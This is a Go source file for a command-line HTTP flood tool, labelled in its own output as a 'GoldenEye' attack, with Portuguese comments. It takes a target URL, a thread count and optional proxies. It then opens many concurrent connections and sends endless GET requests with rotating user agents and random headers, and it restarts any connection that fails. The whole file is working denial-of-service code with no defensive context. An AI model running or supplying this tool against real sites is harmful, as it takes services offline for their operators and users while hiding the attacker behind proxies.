package main

import (
    "context"
    "os"
    "strings"
    "flag"
    "fmt"
    "math/rand"
    "net"
    "net/http"
    "net/url"
    "time"
)

var (
    targetURL      string
    numConnections int
    proxies        []string
    dialTimeout         string
    tlsTimeout          string
    clientTimeout       string
    processTimeout      string 
    userAgents     = []string{
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15",
        "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko",
    }
)

func init() {
    // Definir flags para a URL, número de threads e proxies
    flag.StringVar(&targetURL, "url", "", "URL do servidor alvo (obrigatório)")
    flag.IntVar(&numConnections, "threads", 50, "Número de conexões simultâneas")
    proxiesInput := flag.String("proxies", "", "Lista de proxies separados por vírgula (ex: http://proxy1:port,http://proxy2:port)")
    flag.StringVar(&dialTimeout, "dial-timeout", "30s", "Tempo para conectar ao servidor (ex: 10s, 1m)")
    flag.StringVar(&tlsTimeout, "tls-timeout", "15s", "Tempo para completar handshake TLS (ex: 10s, 1m)")
    flag.StringVar(&clientTimeout, "client-timeout", "2m", "Tempo total para a resposta (ex: 30s, 5m)")
    flag.StringVar(&processTimeout, "process-timeout", "2m", "Tempo total do processo (ex: 5m, 1h)")
    // Parsear os argumentos da linha de comando
    flag.Parse()

    // Validar se a URL foi fornecida
    if targetURL == "" {
        fmt.Println("A URL do servidor alvo é obrigatória.")
        flag.Usage()
        os.Exit(1)
    }

    // Separar os proxies pela vírgula se fornecidos
    if *proxiesInput != "" {
        proxies = strings.Split(*proxiesInput, ",")
    }
}

func generateRandomString(n int) string {
    letters := []rune("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789")
    rand.Seed(time.Now().UnixNano())
    b := make([]rune, n)
    for i := range b {
        b[i] = letters[rand.Intn(len(letters))]
    }
    return string(b)
}
func parseDuration(durationStr string) time.Duration {
    d, err := time.ParseDuration(durationStr)
    if err != nil {
        fmt.Printf("Erro ao parsear duração %s: %v\n", durationStr, err)
        os.Exit(1)
    }
    return d
}
func attack(ctx context.Context, proxyURL string, dialTimeout, tlsTimeout, clientTimeout time.Duration, stopChan <-chan struct{}) {
    select {
        case <-ctx.Done():
            return
        default:    
            var transport *http.Transport

            proxy, err := url.Parse(proxyURL)
            if err != nil {
                fmt.Println("Erro ao parsear o proxy:", err)
                return
            }

            transport = &http.Transport{
                Proxy: http.ProxyURL(proxy),
                DialContext: (&net.Dialer{
                    Timeout:   dialTimeout,
                    KeepAlive: dialTimeout,
                }).DialContext,
                MaxIdleConns:          100,
                IdleConnTimeout:       90 * time.Second,
                TLSHandshakeTimeout:   tlsTimeout,
                ExpectContinueTimeout: 2 * time.Second,
            }
            client := &http.Client{
                Transport: transport,
                Timeout:   clientTimeout,
            }

            req, err := http.NewRequest("GET", targetURL, nil)
            if err != nil {
                fmt.Println("Erro ao criar a requisição:", err)
                go attack(ctx, proxyURL, dialTimeout, tlsTimeout, clientTimeout, stopChan)
                return
            }

            req.Header.Set("User-Agent", userAgents[rand.Intn(len(userAgents))])
            req.Header.Set("Connection", "keep-alive")
            req.Header.Set("Cache-Control", "no-cache")

            // Envia a requisição
            resp, err := client.Do(req)
            if err != nil {
                fmt.Println("Erro ao enviar a requisição:", err)
                go attack(ctx, proxyURL, dialTimeout, tlsTimeout, clientTimeout, stopChan)
                return
            }
            defer resp.Body.Close()

            fmt.Println("Conexão aberta através do proxy status:", resp.Status)

            // Envia cabeçalhos adicionais para manter a conexão ativa
            for {
                select {
                    case <-ctx.Done():
                        return
                    case <-stopChan:
                        return
                    default:
                        req.Header.Set("X-Random", generateRandomString(10))
                        _, err := client.Do(req)
                        if err != nil {
                            fmt.Println("Erro ao manter a conexão:", err)
                            go attack(ctx, proxyURL, dialTimeout, tlsTimeout, clientTimeout, stopChan)
                            return
                        }
                        time.Sleep(time.Millisecond * 100) // Pausa entre requisições para simular tráfego lento
                }
            }
    }
}
func attack_sem_proxy(ctx  context.Context, clientTimeout time.Duration, stopChan <-chan struct{}) {
    select {
        case <-ctx.Done():
            return
        default:
            client := &http.Client{
                Timeout:   clientTimeout, // Ajuste o tempo conforme necessário
            }

            req, err := http.NewRequest("GET", targetURL, nil)
            if err != nil {
                fmt.Println("Erro ao criar a requisição:", err)
                go attack_sem_proxy(ctx, clientTimeout, stopChan)
                return
            }

            req.Header.Set("User-Agent", userAgents[rand.Intn(len(userAgents))])
            req.Header.Set("Connection", "keep-alive")
            req.Header.Set("Cache-Control", "no-cache")

            // Envia a requisição
            resp, err := client.Do(req)
            if err != nil {
                fmt.Println("Erro ao enviar a requisição:", err)
                go attack_sem_proxy(ctx, clientTimeout, stopChan)
                return
            }
            defer resp.Body.Close()

            fmt.Println("Conexão aberta:", resp.Status)

            // Envia cabeçalhos adicionais para manter a conexão ativa
            for {
                select {
                    case <-ctx.Done():
                        return
                    case <-stopChan:
                        return
                    default:
                        req.Header.Set("X-Random", generateRandomString(10))
                        _, err := client.Do(req)
                        if err != nil {
                            fmt.Println("Erro ao manter a conexão:", err)
                            go attack_sem_proxy(ctx, clientTimeout, stopChan)
                            return
                        }
                        time.Sleep(time.Millisecond * 100) // Pausa entre requisições para simular tráfego lento
                }
            }
    }
}
func main() {
    dialTimeout := parseDuration(dialTimeout)
    tlsTimeout := parseDuration(tlsTimeout)
    clientTimeout := parseDuration(clientTimeout)
    processTimeout := parseDuration(processTimeout)

    ctx, cancel := context.WithTimeout(context.Background(), processTimeout)
    defer cancel()
    stopChan := make(chan struct{})
    fmt.Println("Iniciando ataque GoldenEye em", targetURL)
    for i := 0; i < numConnections; i++ {
        if len(proxies) > 0 {
            go attack(ctx, proxies[rand.Intn(len(proxies))], dialTimeout, tlsTimeout, clientTimeout, stopChan)
        } else {
            go attack_sem_proxy(ctx, clientTimeout, stopChan) // Sem proxy
        }
    }
    <-ctx.Done()
    // Envia sinal para parar todas as goroutines
    close(stopChan)
    fmt.Println("Processo finalizado.")
    os.Exit(0)
    // Mantém o programa rodando
    //select {}
}
